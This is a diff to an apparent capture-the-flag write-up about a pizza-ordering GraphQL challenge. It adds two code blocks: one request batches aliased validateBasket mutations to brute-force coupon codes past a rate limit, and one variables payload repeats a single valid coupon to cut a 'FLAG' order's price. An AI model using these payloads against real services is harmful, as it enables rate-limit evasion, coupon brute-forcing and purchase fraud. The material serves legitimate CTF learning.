@@ -172,9 +172,31 @@ This immediately reduces the expected brute forcing time for the entire code spa
 
 Here is a minimal example checking 30 coupon codes (00000–00029) using five aliases:
 
-![alt text](image-1.png)
+```http
+POST /graphql HTTP/1.1
+Host: 9cdc02c2ab20.challs.tudc.tf:30155
+Content-Type: application/json
 
-(excuse the screenshot, jekyll doesn't really like this codeblock)
+{
+  "query": "mutation {
+    b0: validateBasket(input: { pizzas: [], couponCodes: [\"00000\",\"00001\",\"00002\",\"00003\",\"00004\",\"00005\"] }) {
+      appliedCoupons { code description discountType isValid }
+    }
+    b1: validateBasket(input: { pizzas: [], couponCodes: [\"00006\",\"00007\",\"00008\",\"00009\",\"00010\",\"00011\"] }) {
+      appliedCoupons { code description discountType isValid }
+    }
+    b2: validateBasket(input: { pizzas: [], couponCodes: [\"00012\",\"00013\",\"00014\",\"00015\",\"00016\",\"00017\"] }) {
+      appliedCoupons { code description discountType isValid }
+    }
+    b3: validateBasket(input: { pizzas: [], couponCodes: [\"00018\",\"00019\",\"00020\",\"00021\",\"00022\",\"00023\"] }) {
+      appliedCoupons { code description discountType isValid }
+    }
+    b4: validateBasket(input: { pizzas: [], couponCodes: [\"00024\",\"00025\",\"00026\",\"00027\",\"00028\",\"00029\"] }) {
+      appliedCoupons { code description discountType isValid }
+    }
+  }"
+}
+```
 
 Scaling this structure gives access to hundreds of coupon checks per request while remaining inside the rate limit.
 
@@ -324,9 +346,21 @@ mutation Order($input: ValidateBasketInput!) {
 
 Variables:
 
-![alt text](image-2.png)
-
-(again)
+```json
+{
+  "input": {
+    "pizzas": ["FLAG"],
+    "couponCodes": [
+      "18493",
+      "18493",
+      "18493",
+      "18493",
+      "18493",
+      "18493"
+    ]
+  }
+}
+```
 
 This brought the total price below the required 500 euro limit, and the backend returned:
 
